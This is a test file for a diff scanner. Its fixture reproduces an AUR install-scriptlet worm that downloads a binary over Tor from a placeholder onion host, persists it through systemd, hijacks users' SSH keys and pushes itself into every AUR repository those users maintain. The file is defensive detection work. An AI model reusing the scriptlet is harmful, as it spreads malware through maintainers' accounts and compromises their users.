import { describe, expect, it } from 'vitest';
import { DiffScanService } from '../diff-scan.service';
import { addedOnlyDiff, makeChange } from './test-support';

/**
 * Sanitized reproduction of the xsnow install-scriptlet worm (structure only, inert
 * payload host), as published in manticore-projects/aurscan testdata on 2026-08-24.
 * Structure: clean-looking PKGBUILD whose entire payload lives in a dot-prefixed
 * install= scriptlet: Tor drop -> systemd persistence -> SSH key theft ->
 * self-replication via AUR push.
 */
const WORM_PKGBUILD = [
  '# SANITIZED reproduction of the install-scriptlet worm STRUCTURE.',
  'pkgname=xsnow',
  'pkgver=3.7.6',
  'pkgrel=2',
  'pkgdesc="Let it snow on your desktop"',
  "arch=('x86_64')",
  'url="https://www.ratrabbit.nl/ratrabbit/xsnow/"',
  'source=("https://www.ratrabbit.nl/ratrabbit/system/files/xsnow/xsnow-$pkgver.tar.gz")',
  "b2sums=('SKIP')",
  'install=".$pkgname.install"',
  'build() { cd "$srcdir/xsnow-$pkgver"; ./configure --prefix=/usr; make; }',
  'package() { cd "$srcdir/xsnow-$pkgver"; make DESTDIR="$pkgdir" install; }',
];

const WORM_INSTALL = [
  '_do_repo_update() {',
  '  local _tmp_git_path=$(mktemp -d)',
  '  git clone "ssh://aur@aur.archlinux.org/$1.git" "$_tmp_git_path"',
  '  cd "$_tmp_git_path"',
  '  source PKGBUILD',
  '  ((pkgrel++))',
  '  echo -e "\\npkgrel=$pkgrel" >> PKGBUILD',
  '  echo \'install=".$pkgname.install"\' >> PKGBUILD',
  '  cp -f "$_install_script" ".$pkgname.install"',
  '  chown -R root:nobody "$_tmp_git_path"',
  '  chmod g+rwx "$_tmp_git_path"',
  '  sudo -u nobody makepkg --printsrcinfo > .SRCINFO',
  '  git config user.email ""',
  '  git config user.name "nobody"',
  '  git add PKGBUILD .SRCINFO ".$pkgname.install"',
  '  git commit -m "upgpkg: $pkgver-$pkgrel" -a --no-gpg-sign',
  '  git push',
  '  rm -rf "$_tmp_git_path"',
  '}',
  '_update_repos_for_ssh_dir() {',
  '  if [ $(realpath ~/.ssh) != $(realpath "$1") ]; then',
  '    mv -f ~/.ssh ~/.ssh.orig',
  '    ln -s "$1" ~/.ssh',
  '  fi',
  '  export GIT_SSH_COMMAND="ssh -o BatchMode=yes"',
  '  repos=$($GIT_SSH_COMMAND aur@aur.archlinux.org list-repos | tr -d "*")',
  '  for repo in $repos',
  '  do',
  '    _do_repo_update "$repo" &',
  '  done',
  '  wait',
  '  mv -f ~/.ssh.orig ~/.ssh',
  '}',
  '_deploy_systemmanager() {',
  '  until pacman -S --needed --noconfirm tor',
  '  do',
  '    sleep 1',
  '  done',
  '  systemctl enable --now tor.service',
  '  curl -x socks5h://127.0.0.1:9050 http://22222222sanitized.onion/systemmanager -o /usr/local/bin/systemmanager',
  '  chmod +x /usr/local/bin/systemmanager',
  '  cat <<EOF >/etc/systemd/system/SystemManager.service',
  '[Unit]',
  'Description=System Manager',
  'Requires=tor.service',
  'After=tor.service',
  '',
  '[Service]',
  'Environment="HTTP_PROXY=socks5://127.0.0.1:9050"',
  'ExecStart=/usr/local/bin/systemmanager',
  '',
  '[Install]',
  'WantedBy=multi-user.target',
  'EOF',
  '  systemctl daemon-reload',
  '  systemctl enable --now SystemManager.service',
  '}',
  '_async_post_install() {',
  '  _deploy_systemmanager &',
  '  which ssh || return',
  '  _install_script=$(mktemp -u)',
  '  cp "$BASH_SOURCE" "$_install_script"',
  '  export GIT_TERMINAL_PROMPT=0',
  '  for home in /home/*/.ssh /root/.ssh',
  '  do',
  '    _update_repos_for_ssh_dir "$home"',
  '  done',
  '}',
  'post_install() {',
  '  _async_post_install </dev/null >/dev/null 2>&1 &',
  '}',
  'post_upgrade() {',
  '  post_install',
  '}',
];

const service = new DiffScanService();

describe('xsnow-worm regression fixture', () => {
  it('flags the whole kill chain of the install-scriptlet worm', async () => {
    const findings = await service.scanDiffs([
      makeChange(addedOnlyDiff(WORM_PKGBUILD), { new_path: 'xsnow/PKGBUILD', new_file: true }),
      makeChange(addedOnlyDiff(WORM_INSTALL), { new_path: 'xsnow/.xsnow.install', new_file: true }),
    ]);
    const ruleIds = findings.map((finding) => finding.ruleId);

    expect(ruleIds).toContain('CAUR-INSTALL-NEW');
    expect(ruleIds).toContain('PRIV-001');
    expect(ruleIds).toContain('CRED-001');
    expect(ruleIds).toContain('PERSIST-001');
    expect(ruleIds).toContain('PERSIST-005');
    expect(ruleIds).toContain('CAUR-AUR-REPLICATE');
    expect(ruleIds).toContain('CAUR-ONION-URL');
    expect(ruleIds).toContain('CAUR-DESTRUCTIVE');
    expect(ruleIds).toContain('INSTALL-003');

    // The auto-flag threshold is a score of 10; the criticals alone exceed it many times.
    const score = findings.reduce((sum, finding) => sum + { critical: 10, warning: 3, info: 1 }[finding.severity], 0);
    expect(score).toBeGreaterThanOrEqual(10);
  });
});
